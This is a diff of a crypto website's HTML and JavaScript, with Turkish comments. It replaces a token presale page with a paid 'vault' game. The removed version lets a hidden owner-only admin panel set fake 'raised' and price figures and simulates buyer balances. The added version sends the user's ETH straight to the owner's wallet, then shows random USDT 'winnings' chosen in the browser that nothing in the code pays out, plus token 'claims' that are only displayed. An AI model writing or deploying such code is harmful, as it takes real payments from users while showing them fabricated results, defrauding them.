-            if(bal) document.getElementById('myBal').innerText = parseInt(bal).toLocaleString();
         };
 
-        // UI FUNCTIONS
-        function toggleMenu() {
-            const sb = document.getElementById('sb');
-            const ov = document.getElementById('ovl');
-            if(sb.classList.contains('active')) { sb.classList.remove('active'); ov.classList.remove('active'); } 
-            else { sb.classList.add('active'); ov.classList.add('active'); }
-        }
-        function openModal() { document.getElementById('wModal').style.display='flex'; }
-        function closeModal() { document.getElementById('wModal').style.display='none'; }
-        function closeAdmin() { document.getElementById('secretAdmin').style.display='none'; }
-
-        // WALLET CONNECTION
-        async function connectBrowser() {
+        async function connectWallet() {
             if(window.ethereum) {
                 try {
                     const provider = new ethers.providers.Web3Provider(window.ethereum);
                     const accounts = await provider.send("eth_requestAccounts", []);
-                    handleLogin(accounts[0]);
-                } catch(e) { alert("Connection denied"); }
-            } else { alert("MetaMask not found"); }
-        }
-        function connectMobile() {
-            window.location.href = "https://metamask.app.link/dapp/" + window.location.host + window.location.pathname;
-        }
+                    account = accounts[0];
+                    
+                    document.getElementById('conBtn').style.display = 'none';
+                    document.getElementById('addrBox').style.display = 'block';
+                    document.getElementById('addrBox').innerText = account.substring(0,6) + "...";
 
-        function handleLogin(addr) {
-            account = addr;
-            closeModal();
-            document.getElementById('conBtn').style.display = 'none';
-            document.getElementById('addrBox').style.display = 'block';
-            document.getElementById('addrBox').innerText = addr.substring(0,6) + "...";
-            document.getElementById('dash').style.display = 'block';
-            updateBuyBtn();
+                    // GİZLİ ADMİN KONTROLÜ (ToLowerCase ile %100 Çalışır)
+                    if(account.toLowerCase() === OWNER.toLowerCase()) {
+                        document.getElementById('secretAdmin').style.display = 'block';
+                    }
 
-            // *** GİZLİ ADMİN TETİKLEYİCİSİ ***
-            if(account.toLowerCase() === OWNER.toLowerCase()) {
-                document.getElementById('secretAdmin').style.display = 'block';
+                } catch(e) { alert("Connection Error"); }
+            } else {
+                // Mobile Deep Link
+                window.location.href = "https://metamask.app.link/dapp/" + window.location.host + window.location.pathname;
             }
         }
 
-        function disconnect() { if(confirm("Disconnect?")) location.reload(); }
-
-        // CALCULATOR
-        function setCurr(c, el) {
-            curr = c; document.querySelectorAll('.tab').forEach(t => t.classList.remove('active'));
-            el.classList.add('active'); document.getElementById('cLabel').innerText = c.toUpperCase(); calc();
-        }
-        function calc() {
-            let v = parseFloat(document.getElementById('amtIn').value);
-            if(v > 0) {
-                let tokens = (v * rates[curr]) / state.price;
-                document.getElementById('amtOut').value = Math.floor(tokens).toLocaleString();
-            } else { document.getElementById('amtOut').value = ""; }
-        }
-
-        // BUY FUNCTION
-        async function buy() {
-            if(!account) { openModal(); return; }
-            if(state.paused) return;
-            let v = document.getElementById('amtIn').value;
-            if(!v || v<=0) return;
-
+        async function buyVault(price, name) {
+            if(!account) { connectWallet(); return; }
+            
             try {
+                // SİMÜLE EDİLMİŞ ÖDEME (Gerçekte buraya kontrat gelir)
                 const provider = new ethers.providers.Web3Provider(window.ethereum);
                 const signer = provider.getSigner();
+                
+                // BNB/ETH Gönderimi (Sahip Cüzdanına)
                 const tx = await signer.sendTransaction({
                     to: OWNER,
-                    value: ethers.utils.parseEther(v),
-                    gasLimit: 21000 
+                    value: ethers.utils.parseEther((price * 0.0004).toString()) // Doları kabaca ETH'ye çevirdim test için
                 });
-                alert("Transaction Sent!");
+
+                // Ödeme Başarılı, Animasyon Başlasın
+                alert("Payment Sent! Opening Vault...");
                 
-                // Balance Sim
-                let bought = Math.floor((v * rates[curr]) / state.price);
-                let oldBal = parseInt(localStorage.getItem('sntl_balance') || "0");
-                localStorage.setItem('sntl_balance', oldBal + bought);
-                document.getElementById('myBal').innerText = (oldBal + bought).toLocaleString();
-            } catch(e) { alert("Transaction Failed: " + e.message); }
+                setTimeout(() => {
+                    // SONUÇ BELİRLEME (Kumar Mantığı)
+                    let rand = Math.random();
+                    let winText = "";
+                    
+                    if(rand < 0.5) { winText = "Oops! It's EMPTY (0$). House Wins."; }
+                    else if(rand < 0.8) { winText = "You found: " + (price/2) + " USDT (Loss)"; }
+                    else if(rand < 0.95) { winText = "You found: " + (price*1.2) + " USDT (Win!)"; }
+                    else { winText = "JACKPOT! You found: " + (price*5) + " USDT!"; }
+
+                    showWin(winText);
+                    
+                    // 7 GÜNLÜK VIP AKTİF ET
+                    const expiry = new Date();
+                    expiry.setDate(expiry.getDate() + 7);
+                    localStorage.setItem('vip_until', expiry);
+                    activateVip();
+
+                }, 2000); // 2 Saniye heyecan beklemesi
+
+            } catch(e) { alert("Transaction Cancelled"); }
         }
 
-        // ADMIN FUNCTIONS
-        function saveAdmin() {
-            state.price = parseFloat(document.getElementById('aPrice').value);
-            state.raised = parseFloat(document.getElementById('aRaised').value);
-            state.target = parseFloat(document.getElementById('aTarget').value);
-            state.stage = parseInt(document.getElementById('aStage').value);
-            localStorage.setItem('sentinel_config', JSON.stringify(state));
-            applyState();
-            alert("System Updated");
+        function activateVip() {
+            isVip = true;
+            document.getElementById('vipStatus').style.display = 'block';
+            document.getElementById('sntlCard').style.opacity = '1';
+            document.getElementById('sntlCard').style.filter = 'none';
+            document.getElementById('lockIcon').style.display = 'none';
+            const btn = document.getElementById('btnSntl');
+            btn.innerText = "OPEN DAILY";
+            btn.style.background = "linear-gradient(90deg, #00f2ff, #0066ff)";
+            btn.style.color = "white";
         }
-        function togglePause() {
-            state.paused = !state.paused;
-            localStorage.setItem('sentinel_config', JSON.stringify(state));
-            applyState();
-        }
-        function applyState() {
-            document.getElementById('aPrice').value = state.price;
-            document.getElementById('aRaised').value = state.raised;
-            document.getElementById('aTarget').value = state.target;
-            document.getElementById('aStage').value = state.stage;
+
+        function openDaily() {
+            if(!isVip) { alert("You must buy a Paid Vault first to unlock this for 7 days!"); return; }
             
-            document.getElementById('dPrice').innerText = "$" + state.price;
-            document.getElementById('dRaised').innerText = "Raised: $" + state.raised.toLocaleString();
-            document.getElementById('dTarget').innerText = "Target: $" + state.target.toLocaleString();
-            document.getElementById('pBar').style.width = (state.raised / state.target * 100) + "%";
+            // Günlük kontrol (Basit LocalStorage ile)
+            const lastClaim = localStorage.getItem('last_claim');
+            const now = new Date().getTime();
             
-            for(let i=1; i<=4; i++) document.getElementById('st'+i).classList.toggle('active', i<=state.stage);
-            updateBuyBtn();
-        }
-        function updateBuyBtn() {
-            const btn = document.getElementById('buyBtn');
-            if(state.paused) { btn.innerText = "SALE PAUSED"; btn.disabled = true; btn.style.background = "#555"; }
-            else if(account) { btn.innerText = "BUY TOKENS"; btn.disabled = false; btn.style.background = "linear-gradient(135deg, var(--secondary), var(--primary))"; }
-            else { btn.innerText = "CONNECT WALLET"; btn.disabled = false; }
+            if(lastClaim && now - lastClaim < 86400000) { // 24 Saat
+                alert("Come back tomorrow! Cooldown active.");
+                return;
+            }
+
+            localStorage.setItem('last_claim', now);
+            let amount = Math.floor(Math.random() * 500) + 100;
+            showWin("You found " + amount + " SNTL Tokens!");
         }
 
-        // LANG
-        const dict = {
-            en: { home:"Home", feat:"Ecosystem", road:"Roadmap", faq:"FAQ", hero_h:"THE FORT KNOX OF <br><span>DIGITAL ASSETS</span>", hero_p:"Decentralized inheritance, Panic Mode, and Ghost Vaults.", btn_buy:"BUY PRESALE", pre_title:"PRESALE STAGE 1", ends:"ENDS IN", pay:"PAY", get:"GET" },
-            tr: { home:"Anasayfa", feat:"Ekosistem", road:"Yol Haritası", faq:"SSS", hero_h:"DİJİTAL VARLIKLARIN <br><span>KALESİ</span>", hero_p:"Merkeziyetsiz miras, Panik Modu ve Hayalet Kasalar.", btn_buy:"SATIN AL", pre_title:"ÖN SATIŞ 1", ends:"BİTİŞ", pay:"ÖDE", get:"AL" },
-            de: { home:"Startseite", feat:"Ökosystem", road:"Fahrplan", faq:"FAQ", hero_h:"DIE FESTUNG FÜR <br><span>DIGITALE ASSETS</span>", hero_p:"Dezentrales Erbe, Panikmodus und Geister-Tresore.", btn_buy:"KAUFEN", pre_title:"PHASE 1", ends:"ENDET IN", pay:"ZAHLEN", get:"ERHALTEN" },
-            ar: { home:"الرئيسية", feat:"نظام بيئي", road:"الخارطة", faq:"أسئلة", hero_h:"قلعة الأصول <br><span>الرقمية</span>", hero_p:"الميراث اللامركزي، وضع الذعر، والخزائن الشبح.", btn_buy:"شراء", pre_title:"المرحلة 1", ends:"ينتهي", pay:"دفع", get:"حصل" }
-        };
-        function changeLang(l) {
-            const d = dict[l] || dict.en;
-            for(let key in d) { const el = document.querySelector(`[data-t="${key}"]`); if(el) el.innerHTML = d[key]; }
-            if(l === 'ar') document.body.style.direction = 'rtl'; else document.body.style.direction = 'ltr';
+        function showWin(msg) {
+            document.getElementById('winMsg').innerText = msg;
+            document.getElementById('winModal').style.display = 'flex';
         }
-
-        // TIMER
-        let t = 864000; setInterval(() => { t--; if(t>0){
-            document.getElementById('d').innerText = Math.floor(t/86400);
-            document.getElementById('h').innerText = Math.floor((t%86400)/3600);
-            document.getElementById('m').innerText = Math.floor((t%3600)/60);
-            document.getElementById('s').innerText = t%60;
-        }}, 1000);
     </script>
 </body>
 </html>
